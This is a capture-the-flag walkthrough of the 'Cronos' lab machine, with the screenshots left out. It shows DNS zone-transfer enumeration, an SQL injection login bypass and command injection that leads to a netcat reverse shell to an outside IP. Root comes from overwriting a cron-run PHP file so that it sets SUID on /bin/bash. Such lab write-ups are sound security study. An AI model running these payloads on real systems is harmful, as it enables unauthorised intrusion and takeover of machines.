# Cronos

## Basic Information

|          |  |
| :---                 |     :---:      |
| Machine Name         | Cronos     |
| Written by           | Adir Biran       |
| IP Address           | 10.10.10.13       |
| Tools and Techniques |        |

## Method



## Enumeration


#### Nmap
<p align="center">
</p>
*1

Open Ports:  
22 - SSH  
53 - HTTP  
80 - HTTP  

#### Gobuster

Gobuster - Port 80  
<p align="center">
*2
</p>

the website
*3
<p align="center">
</p>

nslookup 10.10.10.13 10.10.10.13
looking for virtual hosts and using the machine as the server
*4
<p align="center">
</p>

found domain: cronos.htb

looking for virtual hosts related to cronos.htb
*5
<p align="center">
</p>
dig axfr cronos.htb @10.10.10.13

cronos.htb
ns1.cronos.htb
admin.cronos.htb

add to /etc/hosts
*6
<p align="center">
</p>

cronos.htb
*7
<p align="center">
</p>

ns1.cronos.htb
*8
<p align="center">
</p>

admin.cronos.htb
*9
<p align="center">
</p>

tried admin:admin and few more default credentials
*10
<p align="center">
</p>

tried sqli
' or 1==1-- -
*11
<p align="center">
</p>

and we're in.
*12
<p align="center">
</p>

pinged myself and captured the traffic with tcpdump
*13
<p align="center">
</p>

tried command injection
;whoami
*14
<p align="center">
</p>

the user running the commands is www-data.

lets get a reverse shell
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f
*15
<p align="center">
</p>

users on the machine:
www-data
noulis
root
*15-2
<p align="center">
</p>


www-data's groups
*15-3
<p align="center">
</p>

suid
find / -perm -4000 2>/dev/null
*16
<p align="center">
</p>

sudo
sudo -l
*17
<p align="center">
</p>

capabilities
getcap -r / 2>/dev/null
*18
<p align="center">
</p>

checking noulis' home directory
*18-2
<p align="center">
</p>

checking /var/www directory
*18-3
<p align="center">
</p>

laravel is installed in /var/www, checking config files in laravel
/var/www/laravel/.env
*19
<p align="center">
</p>

checking crontab
cat /etc/crontab
*20
<p align="center">
</p>

there is a cron job running by root every minute
executing with php the /var/www/laravel/artisan file.

checking the content of the file
*21
<p align="center">
</p>

we can write to that file
*22
<p align="center">
</p>

lets replace the content of the file with the following:
<?php
system('chmod +s /bin/bash');
?>

echo "<?php system('chmod +s /bin/bash'); ?>" > artisan
*23
<p align="center">
</p>

once executed by root, a SUID will be added to /bin/bash and we will be able to get a root shell.

after a minute, checking the /bin/bash permissions:
*24
<p align="center">
</p>

executing a root shell with
bash -p
*25
<p align="center">
</p>

and we're root.
